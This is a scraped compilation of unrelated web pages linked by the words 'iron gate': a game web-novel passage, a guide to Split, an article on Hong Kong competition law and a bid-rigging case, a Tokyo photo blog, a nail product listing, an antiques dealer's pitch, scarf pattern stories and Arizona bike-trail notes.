<p>&#x201c;Yeah, you&#x2019;re right!&#x201d; &#x2026;&#x2026;</p>   <p>After a few minutes, a huge group of players arrived. Many guilds and individual players came to build up their defenses. The closest group of players were from [Flying Dragon], players like Soaring Dragon, Fierce Tiger, Black Tortoise, Drunken Spear and Mu Tian. [Flying Dragon] had over 5000 players, and they had vast amounts of fame and power behind them. The dense mass of players occupied over 300 meters of field, meaning that over 50% of the northern area had been filled up. It looked like each and every single one of them wanted to play an active role in the upcoming battle for City of the Ancients.</p>   <p>Besides those from [Flying Dragon], countless smaller guilds and teams that could not be differentiated from each other, were lined up. Fortunately, [Zhan Long] had a 3 meter gap on both sides, separating us from the others.</p>   <p>&#x201c;For us to end up going in the same direction as [Zhan Long]&#x2026;&#x201d; Fierce Tiger clenched his battleaxe with a look of disdain, &#x201c;They only have 800 people, who knows how long they can last? Hehe, I hope they don&#x2019;t die too quickly, otherwise they&#x2019;ll become a joke.&#x201d;</p>   <p>Drunken Spear whirled his spear and said, &#x201c;Don&#x2019;t belittle them too much, Xiao Yao Zi Zai has always emerged victorious when he has taken command. [Vanguard] and [Hero&#x2019;s Mound] both had their attacks thwarted by [Zhan Long]; a guild like that should have our respect, not our contempt. I propose&#x2026;that we should get close to [Zhan Long], maybe even collaborate together&#x2026;&#x201d;</p>   <p>Soaring Dragon waved his hand in anger, &#x201c;No need; as long as Drunken Spear protects us, we will be fine!&#x201d;</p>   <p>Drunken Spear rubbed at his nose in exasperation, &#x201c;Alright, relying on me isn&#x2019;t bad either. Let&#x2019;s work hard and hope that we get the God of Commerce Badge. We cannot let [Vanguard] or [Prague] get their hands on it first!&#x201d;</p>   <p>&#x201c;Yea, ok!&#x201d;</p>   <p>Mu Tian lifted his own spear and looked at the city, &#x201c;Eh? Why hasn&#x2019;t the first wave of monsters come out yet; are they stuck or something? Did the city block them in? It&#x2019;s already 12:30, shouldn&#x2019;t they have technically come out by now? If not, then let&#x2019;s have a group of players enter the city and investigate the monsters that are inside. Perhaps the activation conditions only occur when people enter the city?&#x201d;</p>   <p>Soaring Dragon&#x2019;s staff emitted dense rays of bright light. He anxiously nodded his head and said, &#x201c;Sounds good. Send some of the faster, but more tanky Knights to enter the city.&#x201d;</p>   <p>&#x201c;Understood!&#x201d;</p>   <p>&#x2026;&#x2026;</p>   <p>After a few minutes, 7 Knights came forward with spears and swords in hand. [Flying Dragon] was the biggest force currently defending themselves around the City of the Ancients, as well as having the most say in things. So while countless players looked on, the 7 Knights entered the city with a prideful arrogance.</p>   <p>&#x201c;Shall we knock?&#x201d;</p>   <p>&#x201c;Yes!&#x201d;</p>   <p>One of the players charged forward and struck at the iron doors with his shield!</p>   <p>&#x201c;Keng!&#x201d;</p>   <p>The door reverberated with a loud gong similar to that of a grand clock as a Knight said, &#x201c;It looks like&#x2026;like there&#x2019;s no response?&#x201d;</p>   <p>&#x201c;That&#x2019;s not right, I swear there&#x2019;s some movement inside&#x2026;&#x201d;</p>   <p>&#x201c;Eh?&#x201d;</p>   <p>The 7 players quickly raised their heads, only to discover an entire row of NPC archers with longbows in their hands. In the next second, the sounds of bows being drawn and arrows being fired filled the air continuously. The golden arrowheads quickly pierced through the Knights&#x2019; battle armor, drawing blood. One by one, shocking damage numbers flew up from the Knights as they fell down in a spray of blood looking like porcupines. Not a single one managed to escape&#x2013;</p>   <p>2837&#xff01; 2981&#xff01; 3004&#xff01; 2785&#xff01;</p>   <p>&#x2026;&#x2026;</p>   <p>&#x201c;F*ck!&#x201d; Soaring Dragon shook his fist in the air and roared, &#x201c;What level are those NPC archers? How can they have such high damage?&#x201d;</p>   <p>Drunken Spear stated, &#x201c;They have to be Lv 70 at the very least&#x2026;&#x201d;</p>   <p>Soaring Dragon was speechless.</p>   <p>&#x2026;&#x2026;</p>   <p>Seeing the 7 corpses, I laughed, &#x201c;Ai&#x2026;I can&#x2019;t even look at this sight&#x2026;&#x201d;</p>   <p>Wolf and Li Mu laughed with me.</p>   <p>Right at that moment, a creaking sound was suddenly heard as the iron gates began to open. A dense mass of monsters began to pour out from within; at last, the City of Ancients had officially started its first wave!</p>   <p>[] &#xa0;[] &#xa0;[] </p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>  </div>

Average temperature of the warmest month of the year is 22&#xb0;C, and the coldest 4&#xb0;C. Also there are the numerous beaches with extraordinarily clean sea. Ba&#x10d;vice is a phenomenon of nature, a sandy beach at the heart of the city, in the vicinity of the city harbor, and it can accommodate over ten thousand people. During the low tides in springtime Ba&#x10d;vice turn into a split version of Copacabana where many famous soccer players first displayed their talent, where the rugby in Split was born, where even in wintertime a unique game of &#x201c;picigin&#x201d; is played (a sort of volleyball, played in the sea shallows with a small ball). Ba&#x10d;vice today represents a best known promenade for all generations, and during nighttime is the favorite center of nightlife. </p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Marjan, Forest Park</h3>       </div>       <div>        <p>Marjan Forest Park covers the westernmost tip of Split Peninsula. It is a green oasis, which has been cherished by the citizens of Split for generations and is considered the &#x2018;lungs of the city.&#x2019; It covers a vast area and offers a myriad of activities and sites. There are countless paths what wend through the forests and along the coast, revealing a well-tendered landscape, jagged beaches, vista points, ancient chapels, and even a zoo. You can take an easy stroll or a jog to the peak of Marjan hill, Telegrin, at 178m above sea level. Alternatively, conduct your Marjan discovery on bike, which you can rent from the Northern Entrance to the park, there are plenty paved roads and off-road routes to choose from. It is prohibited to drive through Marjan Forest Park but you can park by the Northern Entrance. You can also get to Marjan from the city by climbing the stairs to Vidilica from the Varo&#x161; neighborhood west of Riva. </p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Riva, seaside promenade of the city</h3>       </div>       <div>        <p>The Riva started to look the way it does today two centuries ago, when the French, in time of Napoleon ruled these parts through Marshal Marmont. Today this promenade is the cities living room, the most popular and most important public place in Split. In the meantime it has been widened and reconstructed several times, but it was always blessed with the most spectacular set, the south facade of the Diocletian Palace, with the entrance into the Substructures, also the Franciscan monastery with the church of St. Francis, and the Bajamonti De&#x161;kovi&#x107; Palace and the Port Authorities building on the east end. Riva today is thrusting with Caf&#xe9;s and restaurants, an ideal place for having your morning or afternoon coffee, or for an evening out with friends over drinks. Riva is the stage of the city life of Split, a venue for numerous cultural, political and entertainment events. Naturally, Riva is always at its best in time of Sudamja, a celebration dedicated to St. Domnius, the patron saint of Split.</p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Diocletian&#x2019;s palace</h3>       </div>       <div>        <p>The historic core of Split with Emperors Diocletian palace is among the most important works from the late Roman period and it is entered on the list of UNESCO world heritage. The palace is rectangular (215x180m), with two wide vertically crosed streets which lead from its centre towards the four doors in the centre of each side of rectangle. Its south side had a residential character &#x2013; the emperor quaters and auditoriums. In the north section was the military factory where woolen uniforms were made. It was supplied richly with water from the 9 km long aqueduct from the spring of river Jadro nearby Solin, with the capacity of 129600 m3 a day, sufficient for Split today, a town with 200.000 inhabitants. In the 16th century palace doors were named: Golden Gate-North, Silver Gate-East, <b>Iron</b> Gate-West, Bras Gate-South. Golden Gate is among the most preserved examples of its kind in antique period.</p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>Religion buildings in Palace</h3>       </div>       <div>        <p>Main streets come together in the middle of the Palace. South of them is Peristyle, an open space surrounded on the west and east side by the monumented columns with arches directed towards Emperor&#x2019;s quarters. Peristyle was intended for Diocletians cult, and he demanded to be honored as the living son of Jupiter. During the history Peristyle remained a religius central point. The Emperor&#x2019;s mausoleum is octogonal from the outside, of the inside it is of a round shape, with niches among which eight Corinth columns of red granite rise up. It is converted into a Christian church at the beginning of the 5th century, and by the end of the 7th century it becomes cathedral. By lithurgical inventory it is one of the most suggestive and the most worthy sacreal places. In the middle of the 13th century the building of the belfry began on the very place where the prostasis of the late mausoleum once was. Its ground floor is actualy a reconstruction of the idea of antique triumphal arch and it is accorded with arcades of Peristyle. Near Golden Gate is church 1.64m wide and 10m long. It used to be the passage for watchmen who would secure the entrance into the Diocletian Palace. At the beginning of the 9th century it was turned into a Christian church and consecrated to Saint Martin.</p>       </div>      </div>     </div>     <div>      <div>       <div>        <h3>History of Split</h3>       </div>       <div>        <p>Although the city was originally inhabitated since the 6th century BC as a Greek colony named Aspalathos, todays Split officially counts its years from 295 AD, the starting year of the construction of Diocletian&#x2019;s Palace, which became the very heart of the future city. Romans conquered Illyrians (3rd century BC), and established the Province of Dalmatia, with Salona as the capital. Nearby Aspalathos was renamed to Spalatum. When Salona was destroyed by Avars in the 7th century, its displaced Romanic citizens sought refuge in deserted Diocletian&#x2019;s Palace and turned the former private residence into a town. After the fall of the Western Roman Empire, Spalatum became part of Byzantium, with political autonomy. In the 11th century, the city was integrated within the Kingdom of Croatia and later fell under the Croatian &#x2013; Hungarian rule, keeping a significant independence. Despite the reduced autonomy during The Venetian rule (1420-1797) period, Split developed into an important trade port. After a several-year period of Napoleon&#x2019;s rule in the 19th century, Split ended under the Empire of Austria. During that time, Split flourished in culture and architecture.</p>       </div>      </div>     </div>    </div>   </section>  </div>  
   <div>   <p>By&#xa0;George W. Russell</p>   <p><em>Hong Kong&#x2019;s Competition Ordinance, expected to be fully effective next year, is designed to provide a legal framework to prohibit and deter any anticompetitive conduct. George W. Russell looks at how it is likely to take shape, how it will affect business and what it could mean for accountants.</em></p>   <p>When Hong Kong&#x2019;s Housing Author&#xad;ity needed an or&#xad;der of stainless steel <b>gates</b> for its proper&#xad;ties, it called a tender. However, a group of seven manufacturers had already decided who would win and at what cost.</p>   <p>The manufacturers met to set a minimum price and one of them, Gammon <b>Iron</b> Gate Co., was desig&#xad;nated to bid at that price. The rest sent bids at much higher prices. Gam&#xad;mon won the contract, sold the <b>gates</b> and distributed profits equally to each manufacturer through a com&#xad;pany acquired for the purpose, and named, not ironically, Everwin.</p>   <p>When the authority discovered what had happened, it accused the manufacturers of fraud and the In&#xad;dependent Commission Against Cor&#xad;ruption arrested several directors. However, the Court of First Instance ruled that no violations had been committed, due to the absence of an anti-trust law.</p>   <p>Colluding manufacturers are known as a &#x201c;cartel,&#x201d; a closed group of suppliers setting prices. In many countries, such behaviour is illegal, but not in Hong Kong, as the steel gate case highlighted. &#x201c;This kind of cheating is against the public interest and should be discouraged in strong terms,&#x201d; Judge Louis Chan wrote in his 2010 ruling in Sit Kam Tai v. Gam&#xad;mon <b>Iron</b> Gate Co.</p>   <p>Once the Competition Ordinance (Chapter 619 of the Laws of Hong Kong) is enforced from next year, such practices will be outlawed. The legislation will add a new aspect of compliance for companies, but ac&#xad;countants say they are unfazed by the coming law.</p>   <p>&#x201c;We welcome the new competi&#xad;tion law,&#x201d; says Wendy Yung, Execu&#xad;tive Director and Company Secretary at Hysan Development Co., and a Hong Kong Institute of CPAs mem&#xad;ber. &#x201c;An open and competitive envi&#xad;ronment is key to Hong Kong being an international financial and busi&#xad;ness centre.&#x201d;</p>   <p>More than a decade in the making, the ordinance seeks to (a) prevent collusive behaviour among groups of undertakings (defined as any entity engaged in economic activity) and (b) prevent individual undertakings from deterring competition.</p>   <p>&#x201c;The ordinance provides a legal framework to prohibit and deter anticompetitive conduct which pre&#xad;vents or distorts competition in Hong Kong,&#x201d; says Daisy Chan, Executive Director, Public Affairs and Corpo&#xad;rate Services, of the Competition Commission, the agency set up to ad&#xad;minister the ordinance.</p>   <p>Already, the commission has been established with the appointment of 14 members. The chairperson is Anna Wu, an Executive Councillor and former chair of the Consumer Council. Recruitment for the com&#xad;mission&#x2019;s executive has begun with the hiring in March of two senior figures from the Australian Competi&#xad;tion and Consumer Commission.</p>   <p><strong>Principal concerns</strong></p>   <p>The commission will be granted investigative powers to apply the new law. Cases prosecuted by the commission will be heard before the Competition Tribunal, which is to be headed by a President, Godfrey Lam, and a Vice-President, Queeny Au-Yeung. Other members have yet to be appointed.</p>   <p>How much power the commission and tribunal will have remains to be seen. The passage of the ordinance was controversial, encompassing years of hearings and debates, several amendments and a last-minute filibus&#xad;ter in the Legislative Council.</p>   <p>Officials revised the bill several times, cre&#xad;ating more lenient penalties and exempting small- and medium-sized enterprises from many provisions. None of the amendments lawmakers proposed to strengthen the bill were approved. The bill barely passed LegCo with only 31 of the 60 possible votes in favour.</p>   <p>An exemption was granted to all but six stat&#xad;utory authorities, over many public objections, while agreements among smaller companies (those with turnover of less than HK$200 mil&#xad;lion are excluded from the ordinance.</p>   <p>Many industry sectors that will be affected will need to be aware that business practices which may not have been illegal in the past, as bid rigging and abuse of a dominant market po&#xad;sition to prevent competition will be outlawed.</p>   <p>&#x201c;Those are the most common anticompeti&#xad;tive practices,&#x201d; says Derek Lai, Managing Part&#xad;ner, Financial Advisory Services, at Deloitte Greater China and an Institute member.</p>   <p>Price fixing is another matter that will be closely monitored. &#x201c;Given that price fixing is [currently] perfectly legal, there is every rea&#xad;son to believe that it is common,&#x201d; says Thom&#xad;as Cheng, Associate Professor of Law at Hong Kong University and Chairman of the Competi&#xad;tion Policy Committee.</p>   <p>The commission says it will not target spe&#xad;cific industries. &#x201c;It is too early for us to indicate enforcement priorities for the time being,&#x201d; says Chan at the commission. However, most anti&#xad;competition legislation worldwide is orientated towards protecting consumers.</p>   <p>&#x201c;The chairperson and commissioners have backgrounds in law, economics and industry and bring a strong consumer focus to the commis&#xad;sion,&#x201d; says Ninette Dodoo, Counsel at the Fresh&#xad;fields Bruckhaus Deringer law firm in Hong Kong.</p>   <p>Given this background, consumer-facing in&#xad;dustries such as healthcare, leisure, retail and finance, could more likely become targets.</p>   <p>&#x201c;Investigations in these sectors might also prove popular,&#x201d; points out Annalisa Heger, an Associate at Freshfields. &#x201c;[This] could be important to an au&#xad;thority looking to establish its credi&#xad;bility and set its own agenda.&#x201d;</p>   <p><strong>Rolling up sleeves</strong></p>   <p>A century ago, the most severe penalties for cer&#xad;tain breaches of competition legislation were enforced demergers, such as the break-up of John D. Rocke&#xad;feller&#x2019;s Standard Oil in 1911 ordered by the Supreme Court of the United States. (See <em>A history of trust-busting</em> below.)</p>   <p>In Hong Kong, the maximum pecuniary penalty under the Competition Ordinance is up to 10 percent of the domestic turnover of the undertaking concerned in the three of the previous five years with the highest turnover. (Many competition regulators im&#xad;pose fines of up to 10 percent of a company&#x2019;s global turnover.)</p>   <p>The tribunal can also disqualify direc&#xad;tors for up to three years, says Dodoo at Freshfields. &#x201c;This is where the tribunal is satisfied that the director contributed to the contravention of the rule; or had reasonable grounds to suspect the contravention and took no steps to prevent it; or ought to have known that the conduct of the undertaking constituted a contravention.&#x201d;</p>   <p>Complying with the legislation will re&#xad;quire a rethink of many business practices, such as contracts, pricing strategies and pro&#xad;curement processes. &#x201c;I think the first step is education, beginning with a company&#x2019;s management and personnel who will lead in getting it ready for the ordinance,&#x201d; says Yung at Hysan. &#x201c;CFOs and finance teams are in a good position to take key roles.&#x201d;</p>   <p>Lai at Deloitte recommends that Insti&#xad;tute members conduct an assessment or competition compliance audit to identify any po&#xad;tential areas of risk in respect of their current ar&#xad;rangements. &#x201c;The company should develop a com&#xad;petition compliance policy or, if they have one in place already, check whether any amendments are required,&#x201d; he says.</p>   <p>Law firms are also assisting clients on aspects of the ordinance. &#x201c;We can identify the high-risk areas of their business such as units that set prices and other terms,&#x201d; says John Hickin, a Partner with the Mayer Brown JSM firm.</p>   <p>Units that have regular dealings with competi&#xad;tors, as well as suppliers and customers, are anoth&#xad;er cause for concern, Hickin adds. &#x201c;Start thinking about promoting awareness internally,&#x201d; he advises. &#x201c;Particularly for the finance industry, it is import&#xad;ant to be aware that cartel activity relies on the un&#xad;lawful exchange or disclosure of competition-sensi&#xad;tive information among competitors.&#x201d;</p>   <p>Industries likely to face particular scrutiny, such as construction, are urged to pay particular atten&#xad;tion to their policies. &#x201c;Internal procedures should be in place to minimize the company&#x2019;s exposure to any liability risks, thereby mitigating the likeli&#xad;hood of an investigation,&#x201d; suggests Christopher To, Executive Director of the Hong Kong Construction Industry Council.</p>   <p><strong>Preparing the ground</strong></p>   <p>The Competition Commission will spend the next 12 to 18 months drafting guidelines, carrying out con&#xad;sultations and educating the business community, says Chan at the commission, adding that consulta&#xad;tions with stakeholders and members of the public will begin during the first half of this year.</p>   <p>Yung at Hysan urged Institute members in busi&#xad;ness that early preparation would help them partic&#xad;ipate in the guidelines consultation process. &#x201c;This will also enable you to assist your organiza&#xad;tion in educating business units, auditing business practices, and adjusting business behaviour as appropriate,&#x201d; she says.</p>   <p>Hickin said there was no clearly articu&#xad;lated economic policy in its ordinance other than to enhance economic efficiency and the free flow of trade. &#x201c;This leaves the courts and the Competition Commission room to set policy,&#x201d; he says.</p>   <p>As more data become available, individu&#xad;al sectors will be assessing the likely impact. &#x201c;The construction industry in Hong Kong is preparing itself for the enactment of the law and has made submissions to LegCo,&#x201d; says To. &#x201c;Industry stakeholders are wait&#xad;ing to know more about its actual operation through reviewing official guidelines, deci&#xad;sional practice and case law to clarify exactly how it will apply when it is full swing.&#x201d;</p>   <p>He points out that some aspects of the or&#xad;dinance require further clarification. &#x201c;Some unclear definitions include &#x2018;predatory pric&#xad;ing&#x2019; under sections 21-24 and &#x2018;a substantial degree of market power&#x2019; under section 35 of the ordinance.&#x201d; Neither concept is specifical&#xad;ly defined under the ordinance with any kind of figure or threshold.</p>   <p>The commission says it is eager to work with businesses to develop clear policies and guidelines by the time the ordinance be&#xad;comes fully effective. &#x201c;[We plan] to discuss with the business community on how to de&#xad;velop risk management systems, good prac&#xad;tices and internal controls as tools to achieve compliance with the ordinance,&#x201d; says Chan.</p>   <p>However, the commission urges compa&#xad;nies to put as much as possible in place as soon as possible. As Chan says: &#x201c;This will help correct potential anticompetitive be&#xad;haviour even before the ordinance takes full effect.&#x201d;</p>   <p>This article was originally published in the May 2014 issue of <em>A Plus</em>.</p>   <p>[stextbox id=&#x201d;info&#x201d; caption=&#x201d;A HISTORY OF TRUST-BUSTING&#x201d;]</p>   <p>Anti-competition rules have their roots in medieval English common law, but the first modern competition legislation was that of Canada in 1889. The United States followed suit in 1890; there it became known as anti- trust legislation and broke up monopolies in railways, oil, livestock and tobacco.</p>   <p>Another long-term focus has been pub&#xad;lic procurement, where collusive practices and bid rigging drove up the cost of govern&#xad;ment tenders. The U.S. pursued govern&#xad;ment bid-rigging cases as early as the 1890s and it remains a global issue to this day, as seen in Sit Kam Tai v. Gammon <b>Iron</b> Gate Co., the Housing Authority case.</p>   <p>&#x201c;Anticompetitive practices in public pro&#xad;curement are, and will remain, among the top enforcement priorities of most compe&#xad;tition agencies,&#x201d; says Antonio Capobianco, Senior Expert in Competition Law Enforce&#xad;ment with the Organisation for Economic Co-operation and Development in Paris. &#x201c;Bid-rigging cases are the most common type that we see at the national level.&#x201d;</p>   <p>Hong Kong is far from alone in its pursuit of such anticompetitive behaviour. The Aus&#xad;tralian law firm Minter Ellison, in a recent note to clients, noted that anticompetitive behaviour was a worldwide phenomenon, even in developed economies.</p>   <p>Last year, nine Japanese companies paid US$740 million in fines for a price-fixing conspiracy targeting U.S. car manufacturers such as General Motors and Ford Motor.</p>   <p>This year, the European Commission fined 17 producers of pre-stressed steel a total of &#x20ac;269 million for operating a cartel lasting 18 years.</p>   <p>In 2011, three Australian pre-mixed con&#xad;crete suppliers were fined A$20 million for engaging in price-fixing and market-sharing cartels. Authorities imposed A$1.3 million in fines &#x2013; the maximum possible &#x2013; on con&#xad;struction companies tendering for govern&#xad;ment contracts for bid rigging.</p>   <p>In the United Kingdom, the Office of Fair Trading imposed fines of &#xa3;129.2 million on 103 construction firms for collusive tender&#xad;ing for government contracts in 2009.</p>   <p>Hong Kong&#x2019;s Competition Commission is likely to pay close attention as global trends in competition enforcement could influence policy at the fledgling authority. &#x201c;The Competition Commission [might] look to build relationships with competition authorities in jurisdictions that have more established competition regimes,&#x201d; says Ninette Dodoo, Counsel at the Freshfields Bruckhaus Deringer law firm in Hong Kong.</p>   <p>These exchanges could in turn influence the types of cases the commission might bring,&#x201d; she adds. Noting ongoing investiga&#xad;tions in China, Dodoo suggests the commis&#xad;sion might initially target vertical arrange&#xad;ments (distribution or franchising deals that operate &#x2018;vertically&#x2019; through a supply chain) that result in artificially high prices. &#x201c;Like re&#xad;sale price maintenance, where distributors agree with a manufacturer to sell a certain product at a certain price.&#x201d;[/stextbox]</p>   <footer>    <p> Categories: , | Tags: , , , , | </p>   </footer>    <div>    <div>     <h3>Author: </h3>     <p>GAA Accounting is the journal of the Global Accounting Alliance.</p>    </div>    </div>   </div>  
   <div>     <div>          <div>     <p>Autumn sky in Japan implies CLEAR and BLUE skies. They are called as Aki-bare, &#x79cb;&#x6674;&#x308c;. Mornings start with early sunrise and sunset by 05:00 p.m. It is one of the best seasons to capture HDR shots with thin cloud layers in early morning of blue hour photography in early evenings. The autumn colors add the overall colorful ambience to photographs during this period. Here is a photo shoot done in HDR at the National Diet Building near Kokkai Gijidou Mae Station in Tokyo.The National Diet building was off limits on a early morning this week when I went there at 06:00 types, but there was good sunshine coming in from the left side illuminating the premises with beautiful thin clouds in the sky. This is ideal for a HDR shot. The road leading to the National Diet Building is lined with beautiful Ginkgo Biloba trees, the leaves of which turn yellow in autumn. Called as &#x201c;Ichou&#x201d;, the trees blossom by last half of November and this week the status was full colors&#x2026;The National Diet Building itself had very few visitors that early morning with a lone patrol car as always guarding the entrance. Some other visitors were at the gate peeping in from the <b>iron</b> gate in front.The trees had not only changed colors, but there were also leaves which had fallen on the street and already the streets were lined up with beautiful carpet of leaves. If you go after the afternoon mostly the leaves are cleared by the metropolitan staff on a daily basis so you need to catch the fallen leaves only in the early mornings.People tend to crowd locations like Meiji Gaien Outer Garden, Ueno Park and other locations for fall leaves, but all these locations end up being crowded that the &#x201c;serene&#x201d; aspect is somehow lost and I usually have been strolling at this location at least once per season.&#xa0;The yellow contrast &#xa0;with the Diet Building in the background. Natural beauty contrasted with architectural beauty.Notice the lack of visitors in the lanes around the Kokkai Gijidou and the peaceful streets with yellow colors.Location of the street where there are at least 80-100 trees with the best season to visit last week of November. Access from the Tokyo Metro Kokkai Gijidou Mae Station on the Marunouchi Line. Beautiful morning, one more shot&#x2026;. Collected a few Ginkgo Biloba nuts, yes the quite smelly nuts which are inedible but have been gathering attention on being having medicinal benefits. They have been said to help with controlling and stabilising blood sugar levels which is something a Gingko Biloba tree that can live for 1000 years has to offer to us. Hopefully more research in this direction brings some new treatments. It also has other medicinal benefits. One final shot, hope you find a new spot in the city and experience Tokyo sutumn in a serene environment.</p>     <div>      <h3>Related Posts:</h3>     </div>     <div>      <div>       <h3>Share this article on :</h3>      </div>     </div>    </div>    </div>    </div>

This will help prevent the finish from being damaged. The painted flat black finish is a baked on Acrylic Melamine paint which allows the product to be used outdoors and indoors. The rusted finish has a powdered rust that that does slightly rub off when touched, it is recommend that you use these clavo indoors and areas that where they will not be handled often. The unfinished clavo will naturally rust if exposed to the elements it is recommend spraying a clear finish to avoid it.</span></p>        <ul>         <li><span>Rustic Decorative Nail</span></li>         <li><span>Diameter 0.75&#x2033;</span></li>         <li><span>Available Finishes: Black, Rusted, and Unfinished</span></li>         <li><span>Decorative <b>Iron</b> Hardware for Furniture, Doors, <b>Gates</b>, Garages, and Cabinets</span></li>         <li><span>Hand Forged (Slight Variations)</span></li>        </ul>       </div>      </div>     </div>    </div>   </div>   <p>&#xa0;</p>  </div>

   <div>   <p><span>In a stroke of pure genius (Gaines is not the modest type), I decided to create a business plan based upon two antique items-of-interest: the wrought <b>iron</b> gate and the stained glass window. Why? Because I had learned (i.e., witnessed) that these two items are <strong>the two most influential antiques</strong> with respect to increasing both the perceived and <strong>the real value</strong> of a home.</span></p>   <p>Why these two antiques? {pls quote me!} &#x201c;Out of all architectural antiques and/or elements, the stained glass window has the highest &#x201c;exponent value&#x201d; when it comes to enhancing the enjoyment and beauty in a home&#x2019;s d&#xe9;cor, <strong>and increasing its resale value!</strong></p>   <p><span>It is an established fact (in the antique retail field and real estate world) that a single stained glass, appropriated in a dwelling, will increase the value (via pre and post appraisal) disproportionate to the cost of the glass.&#x201d;</span></p>   <p>In short the home will appraise for substantially more if you place a better-than-average (your taste) stained glass in the foyer, bedroom, living room, alcove, etc. Instantly the house becomes a unique home.</p>   <p>The stained glass becomes the focal point in the domain. The stained glass will &#x201c;out shine&#x201d; hardwood floors, teak paneling, grande pianos, and grandpa&#x2019;s clock. Specifically, a three hundred dollar ($300) piece of stained glass (*) will increase the market value by $3,000. That&#x2019;s right!</p>   <p>The implication of this astounding claim is astonishing! Enormous! Thus, if the average spec-house builder (Democrat, Republican, or Independent) would add a single stained glass window to a $350,000 home, the real estate agent could relax and afford a ticket to the Bahamas. (That is as near a fact as I care to go!)</p>   <p>(*) FYI: most stained glass in our inventory appraises for $100 per square foot.</p>   <p>If a new house owner / builder/ designer / investor / architect / under-writer / interior-designer / mortgage broker / artist / music-teacher / mama and papa would perform this same act-of genius (yup: put in one (1) stained glass panel), then we (you and me) could revolutionize home construction, home d&#xe9;cor, remodeling, and home finance&#x2026;..</p>   <p>I {Gaines Steer} stake my reputation on this!!!

   <div>   <h3>Barbara Northrup patterns are&#xa0;produced as limited editions. Each pattern I design starts with an image that has inspired me in some way. &#xa0;That story of inspiration is an important part of what makes my designs unique. Every scarf &#xa0;comes with a numbered card that features the original image and its story.</h3>   <p>&#xa0;</p>   <h4>Pattern Stories:</h4>   <p>&#xa0;</p>   <div>    <div>     <div>      <h4><strong>No. 71 Parrot</strong></h4>      <p><strong>Aqua &amp; Fuchsia</strong></p>      <p>The bright color combinations of Parrots create some of the most fascinating patterns in nature. A blue and gold Macaw provided the basis for this design.&#xa0; I am intrigued by the subtle variations in color found in the individual feathers and even more so, by the moir&#xe9; pattern that is visible when viewed up close.</p>      <p>&#xa0;</p>      <h4><strong>No.&#xa0;83 Cockles</strong></h4>      <p><strong>Cerulean &amp; Tangerine</strong></p>      <p>Occasionally hurricanes pass by off the shore of Coastal Georgia and in their wake they leave shell covered beaches.&#xa0; After a storm some years ago, the beach was so thick with Cockle Shells you could barely see the sand. &#xa0;I overlaid the image of the cockles with one of swirls and scrolls to reflect the blowing winds and waters that moved these shells up onto the land from their home on the sea floor.</p>      <p>&#xa0;</p>      <h4><strong>No.&#xa0;93 Driftwood</strong></h4>      <p><strong>Azure &amp; Magenta</strong></p>      <p>Driftwood beaches are common along the coastlines of Georgia and the Carolinas.&#xa0; They are places where the ocean is taking back the land. &#xa0;These forested shorelines are slowly giving way to the sea leaving an eerie landscape of wooden skeletons.&#xa0; The curved shapes of the branches and shadows in this image produced a pattern that reminds me of antique marbled bookend paper.</p>      <p>&#xa0;</p>      <h4><strong>No. 87 Moroccan Leaf</strong></h4>      <p><strong>Indigo &amp; Scarlet</strong></p>      <p>I love it when the unexpected happens. This pattern started with a simple and earthy image of a vine growing along a wall.&#xa0; I was intrigued by the peeling paint, the shapes of the leaves and the pop of bright red. To my delight, the resulting pattern developed into an intricate and delicate pattern reminiscent of Ottoman mosaics.</p>     </div>     <div>      <div>       <h4><strong>No.&#xa0;97 Zebra Tush</strong></h4>       <p>Yes, that is his derriere!&#xa0; Zebras are my favorite animal to photograph.&#xa0; Head to toe and back to front, they provide such wonderful graphic interest. &#xa0;This guy had a very sweet face but what really caught my eye was the strong back line and curved fine lines that accentuated this animal&#x2019;s rump.</p>      </div>     </div>     <p>&#xa0;</p>     <div>      <div>       <p>&#xa0;</p>       <h4><strong>No. 89 Daisy Days</strong></h4>       <p>Summertime in the Appalachian Mountains is beautiful.&#xa0; Cool green forests open into fields of daisy flowers that cover the landscape with randomly patterned carpets of color.&#xa0; This design reflects the lively, carefree and colorful fun of summer in a mountain meadow.</p>       <p>&#xa0;</p>       <p>&#xa0;</p>      </div>     </div>    </div>   </div>  </div>  
   <div>    <p> is a long-distance singletrack that runs from the boundary of the Prescott National Forest, across Highway 69 south to the Carefree Highway. There are many trail heads to access this trail starting from New River all the way up to Prescott. I would recommend for experienced Intermediate Riders. It requires top physical conditioning and good technical skills. Some sections have dead drop exposure but the views are awesome. There are many trails heads and each section offers something different. To find all the trails heads and section ;</p>   <p>&#xa0;</p>   <p> in Prescott National Fores.&#xa0;Yeager Canyon supports an attractive riparian corridor, where deciduous hardwoods create a canopy of shade. Fall paints the canyon in brilliant shades of yellow and gold and is an excellent time of year to explore this and other trails in the Mingus Mountain area. Fortunate visitors may spot deer, elk, and a variety of birds. Black bears also make their home in this area. Rolled rocks along the trail show where bears have passed by, turning stones in search of grubs and other insects. </p>   <p>. This is a fun trail that climbs 1000 ft in 7 miles.&#xa0;Sweet twisting, winding, 12-18&#x2033; wide singletrack, mostly in the pines, near Lynx lake. Nothing tech, just go fast and take chances, like riding a roller coaster and trying to keep it on the track, good times.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>This is one of the few &#x201c;Rail to Trail&#x201d; projects in Arizona. There are outstanding views of &#xa0;Watson Lake and Granite Dells, as well as wildlife viewing. Walk, hike, bike or horseback along this six mile trail that was originally built by the Santa Fe Railway in 1893. The Peavine connects with the for another four mile trek along more railroad bed. Take Hwy 89 to Prescott Lakes Parkway, then to Sundog Ranch Road. Shown on the NE Prescott Trails Map. Parking at the Peavine Trailhead off Prescott Lakes Parkway has a $2 fee.</p>   <p>&#xa0;</p>   <p> Access from Peavine Trail head. Will start with sharp climb to the first summit. This part of the trail is very well maintained and includes one uphill switchback. From this summit, enjoy the bermed turns, then a short descent into the valley. The trail winds through small shrubs and trees and approaches the Juvenile Detention Center. From here, there is the next climb which has a few loose rocks and is stepped nicely. Then another short descent weaving along the hillside to a small creek crossing, then the final climb begins. Nothing technical here, just a gentle sustained climb to the summit. As you near the summit you&#x2019;ll have great views of Thumb Butte, Granite Mountain and Prescott to the west.</p>   <p> has a little something for everyone. With multiple loops in this area to ride, make it as long or short as you 